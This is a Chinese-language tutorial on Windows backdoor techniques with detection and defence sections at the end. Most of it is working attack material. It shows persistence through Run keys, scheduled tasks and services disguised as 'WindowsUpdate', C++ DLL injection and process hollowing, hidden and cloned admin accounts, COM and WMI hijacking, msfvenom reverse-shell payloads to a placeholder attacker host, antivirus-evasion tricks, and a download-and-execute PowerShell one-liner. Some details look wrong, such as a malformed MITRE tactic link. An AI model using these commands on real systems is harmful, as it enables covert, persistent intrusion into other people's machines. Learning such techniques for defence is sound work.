# Windows后门技术

Windows后门是攻击者在获得系统权限后，为了维持持久控制而植入的后门程序和技术。本文档涵盖常见的Windows后门技术、检测和防御方法。

## 1 后门分类

```
Windows后门分类:
├── 进程注入型
│   ├── Dll注入
│   ├── Process Hollowing
│   └── PE注入
│
├── 启动持久型
│   ├── 注册表Run键
│   ├── 计划任务
│   ├── 服务
│   └── WMI事件订阅
│
├── 账户隐藏型
│   ├── 隐藏账户
│   ├── 克隆账户
│   └── 远程管理账户
│
├── 组件劫持型
│   ├── COM组件劫持
│   ├── DLL劫持
│   └── WMI类劫持
│
└── 原生持久型
    ├── PSExec后门
    ├── RDP后门
    └── Winsock LSP
```

## 2 用户态后门

### 2.1 注册表Run键后门

```cmd
# 创建Run键后门
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\windows\temp\backdoor.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\windows\temp\backdoor.exe" /f

# 当前用户Run键
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\windows\temp\backdoor.exe" /f

# RunOnce键 (单次执行后删除)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "WindowsUpdate" /t REG_SZ /d "C:\windows\temp\backdoor.exe" /f

# 绕过杀软的方法
# 使用合法程序名
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\System32\cmd.exe /c calc"
```

### 2.2 注册表类型

| 注册表位置 | 键名 | 用途 |
|------------|------|------|
| HKLM\...\Run | Windows自动启动 | 每次登录执行 |
| HKCU\...\Run | 用户自动启动 | 当前用户登录执行 |
| HKLM\...\RunOnce | 单次运行后删除 | 单次执行 |
| HKLM\...\RunServices | 服务启动时运行 | 系统服务启动时 |
| HKLM\...\RunServicesOnce | 服务单次运行 | 一次性服务 |
| HKCU\...\RunOnce | 用户单次运行 | 用户登录单次执行 |

### 2.3 计划任务后门

```cmd
# 命令行创建计划任务
schtasks /create /tn "WindowsUpdate" /tr "C:\windows\temp\backdoor.exe" /sc DAILY /st 02:00 /ru SYSTEM /f

# 使用高权限运行
schtasks /create /tn "WindowsUpdate" /tr "C:\windows\temp\backdoor.exe" /sc WEEKLY /d MON /st 09:00 /ru "NT AUTHORITY\SYSTEM" /f

# 隐藏计划任务
schtasks /create /tn "WindowsUpdate" /tr "C:\windows\temp\backdoor.exe" /sc DAILY /st 02:00 /ru SYSTEM /f /hidden

# 伪装为系统任务
schtasks /create /tn "Microsoft\Windows\WindowsUpdate" /tr "C:\windows\temp\backdoor.exe" /sc DAILY /st 02:00 /ru SYSTEM /f
```

### 2.4 服务后门

```cmd
# 创建服务后门
sc create "WindowsUpdate" binpath= "C:\windows\temp\backdoor.exe" DisplayName= "Windows Update" start= auto

# 修改现有服务
sc config "ServiceName" binpath= "C:\windows\temp\backdoor.exe"
sc config "ServiceName" obj= "LocalSystem"

# 服务信息
sc qc ServiceName
sc queryex type= service state= all

# 使用 PowerShell
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\windows\temp\backdoor.exe" -StartupType Automatic
```

## 3 进程注入技术

### 3.1 DLL注入

```cpp
// 经典DLL注入
// 1. 打开目标进程
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

// 2. 在目标进程分配内存
LPVOID lpBuf = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE);

// 3. 写入DLL路径
WriteProcessMemory(hProcess, lpBuf, lpDllPath, dwSize, NULL);

// 4. 创建远程线程
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)LoadLibrary, lpBuf, 0, NULL);
```

### 3.2 Process Hollowing (傀儡进程)

```cpp
// 1. 创建挂起状态进程
STARTUPINFO si = {0};
PROCESS_INFORMATION pi = {0};
CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, TRUE,
    CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. 替换进程内存
// 获取PEB地址
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);
ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &dwImageBase, sizeof(DWORD), NULL);

// 3. 卸载原镜像
NtUnmapViewOfSection(pi.hProcess, (LPVOID)dwImageBase);

// 4. 分配新内存并写入恶意程序
LPVOID lpAlloc = VirtualAllocEx(pi.hProcess, (LPVOID)newImageBase, dwSize, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE);
WriteProcessMemory(pi.hProcess, lpAlloc, pFileData, dwSize, NULL);

// 5. 设置新入口点并恢复线程
ctx.Eax = (DWORD)(newImageBase + entryRVA);
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

### 3.3 经典DLL注入工具

```bash
# 使用 PowerSploit 的 Invoke-DLLInjection
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DLLInjection.ps1')"
Invoke-DLLInjection -ProcessID 1234 -DLLPath "C:\temp\malicious.dll"

# 使用 Metasploit
use post/windows/manage/dl_inject
set PID 1234
set DLL /tmp/malicious.dll
run
```

## 4 账户后门

### 4.1 隐藏账户

```cmd
# 创建隐藏账户 (带$符号)
net user hacker$ Password123! /add
net localgroup administrators hacker$ /add

# 隐藏账户登录查看
# 在登录界面不显示，但可在命令行看到
net user hacker$

# 修改注册表隐藏
# 在HKLM\SAM\Domains\Account\Users\下需要特殊权限
regedit # 需要赋予特定权限才能查看
```

### 4.2 克隆账户

```cmd
# 使用guest账户克隆
# 1. 启用guest账户
net user guest /active:yes

# 2. 设置guest密码与administrator相同
net user guest Password123!

# 3. 加入管理员组
net localgroup administrators guest /add

# 4. 克隆SID (需要修改注册表)
# HKLM\SAM\SAM\Domains\Account\Users\000001F5 (Guest)
# 将Administrator的F值复制到Guest的F值

# 查看SID
whoami /user
```

### 4.3 远程管理账户

```cmd
# 创建远程管理账户
net user backdoor$ Password123! /add
net localgroup "Remote Management Users" backdoor$ /add 2>nul
net localgroup "Remote Desktop Users" backdoor$ /add 2>nul

# 允许远程桌面
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 开启RDP
sc config TermService start= auto
net start TermService
```

## 5 组件劫持

### 5.1 COM组件劫持

```cpp
// COM劫持原理
// 注册表 HKLM\Software\Classes\CLSID 下存储COM组件
// 攻击者可以修改CLSID指向恶意DLL

// 示例: 修改IatServerImpl
// 路径: HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32
// 默认值改为恶意DLL路径

// 注册表修改命令
reg add "HKLM\Software\Classes\CLSID\{12345678-1234-1234-1234-123456789012}" /ve /d "C:\temp\malicious.dll" /f
reg add "HKLM\Software\Classes\CLSID\{12345678-1234-1234-1234-123456789012}\InprocServer32" /ve /d "C:\temp\malicious.dll" /f
```

### 5.2 WMI类劫持

```powershell
# 查看现有WMI类
Get-WMIObject -Namespace "root\cimv2" -Class Win32_Process

# 创建WMI事件订阅后门
$FilterName = "SystemAudit"
$ConsumerName = "SystemAudit"
$Command = "C:\windows\temp\backdoor.exe"

# 创建Filter
$null = Set-WMIInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = $FilterName
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
}

# 创建Consumer
$null = Set-WMIInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $ConsumerName
    CommandLineTemplate = $Command
}

# 绑定
$Filter = Get-WMIObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='$FilterName'"
$Consumer = Get-WMIObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'"
$null = Set-WMIInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$Filter;Consumer=$Consumer}
```

### 5.3 DLL劫持

```text
DLL劫持原理:
1. 程序按顺序搜索DLL位置
   - 当前目录
   - 系统目录 (System32)
   - 16位系统目录 (System)
   - Windows目录
   - PATH环境变量目录

2. 攻击者可以放置恶意DLL在搜索顺序更早的位置

常见可劫持的DLL位置:
- 程序目录
- System32外围目录
- 用户可写目录

查找方法:
- Process Monitor监控DLL加载
- 检查缺失DLL
- 检查可信路径中的DLL
```

## 6 远控后门

### 6.1 Cobalt Strike 配置

```csharp
// 生成后门
# 在Cobalt Strike中
# Attacks -> Packages -> Windows Executable (SMB)
# 生成绑定型Beacon

# 或生成无阶段后门
# Attacks -> Packages -> Windows Executable

# Listener配置
# Cobalt Strike默认使用 SMB Beacon (绑定)
# 或 HTTP Beacon (反向)
```

### 6.2 Metasploit Payload

```bash
# 生成 Meterpreter 后门
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe

# 生成stageless后门
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o shell.exe

# PowerShell后门
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f psh -o shell.ps1
```

### 6.3 免杀后门

```powershell
# 使用 Amadey 或其他商业远控
# 或使用以下方法免杀:

# 1. 绑定到合法程序
COPY /B C:\Windows\System32\cmd.exe + backdoor.exe output.exe

# 2. 加密Payload
# 使用 XOR 或 AES 加密
# 解密后执行

# 3. 代码混淆
# 使用 Metasploit 的 encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10

# 4. 分离Payload
# 存储在图片或文档中
# 运行时读取并执行
```

## 7 检测技术

### 7.1 检查异常进程

```powershell
# 查看隐藏进程
Get-Process | Where-Object { $_.ProcessName -notmatch "^(svchost|explorer|cmd|powershell)$" } | Select-Object Name, Id, Path

# 检查非签名进程
Get-AuthenticodeSignature * | Where-Object { $_.Status -ne "Valid" }

# 检查异常网络连接
Get-NetTCPConnection | Where-Object { $_.State -eq "ESTABLISHED" } | Select-Object OwningProcess, LocalAddress, LocalPort, RemoteAddress, RemotePort

# 查看可疑服务
Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object Name, DisplayName, StartType
```

### 7.2 检查启动项

```powershell
# 查看注册表启动项
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"

# 查看计划任务
Get-ScheduledTask | Select-Object TaskName, State, Author

# 查看服务
Get-WmiObject -Class Win32_Service | Where-Object { $_.StartMode -eq "Auto" } | Select-Object Name, DisplayName, PathName

# 查看WMI事件订阅
Get-WMIObject -Namespace "root\subscription" -Class __EventFilter
Get-WMIObject -Namespace "root\subscription" -Class CommandLineEventConsumer
```

### 7.3 检查账户

```cmd
# 查看所有账户
net user

# 查看隐藏账户
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

# 检查Guest账户状态
net user guest

# 检查管理组
net localgroup administrators
```

## 8 防御措施

### 8.1 账户安全

```powershell
# 1. 禁用不必要的账户
net user guest /active:no
net user administrator /active:no

# 2. 设置强密码策略
# 本地安全策略 -> 账户策略 -> 密码策略

# 3. 启用账户锁定
# 本地安全策略 -> 账户策略 -> 账户锁定策略

# 4. 监控账户创建
# 启用安全日志 Event ID 4720 (用户账户创建)
```

### 8.2 启动项监控

```powershell
# 1. 启用 Sysmon 监控
# 下载并安装 Sysinternals Suite

# 配置 Sysmon 规则监控:
# - 注册表 Run 键修改
# - 计划任务创建
# - 服务创建/修改

# 2. 部署 Endpoint Detection & Response (EDR)
# 如 Microsoft Defender for Endpoint

# 3. 启用 AppLocker 或 Windows Defender Application Control (WDAC)
```

### 8.3 网络层防御

```powershell
# 1. 启用 Windows 防火墙
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# 2. 阻止非常用端口出站
# 只能通过代理或指定端口出站

# 3. 监控异常连接
# 使用 Windows Defender Firewall 或第三方防火墙

# 4. 禁用不必要的服务
# Remote Registry
# Windows Remote Management
# SMBv1
```

### 8.4 定期安全检查

```powershell
# 1. 定期检查账户
$users = net user | Select-String "^.*User.*$" -Context 1
# 查找新增账户

# 2. 检查网络连接
$conns = Get-NetTCPConnection -State Established
# 查找异常连接

# 3. 检查服务
Get-WmiObject -Class Win32_Service | Where-Object { $_.StartMode -eq "Auto" -and $_.Status -eq "Running" }

# 4. 使用 BloodHound 分析
# 定期收集数据，检测异常权限

# 5. 定期打补丁
# 及时修复已知漏洞
```

## 9 参考资源

- Metasploit后门: https://github.com/rapid7/metasploit-framework
- Cobalt Strike: https://www.cobaltstrike.com/
- PowerSploit: https://github.com/PowerShellMafia/PowerSploit
- Sysmon: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
- MITRE ATT&CK Tactic T1500: https://attack.mitre.org/tactics/T1500/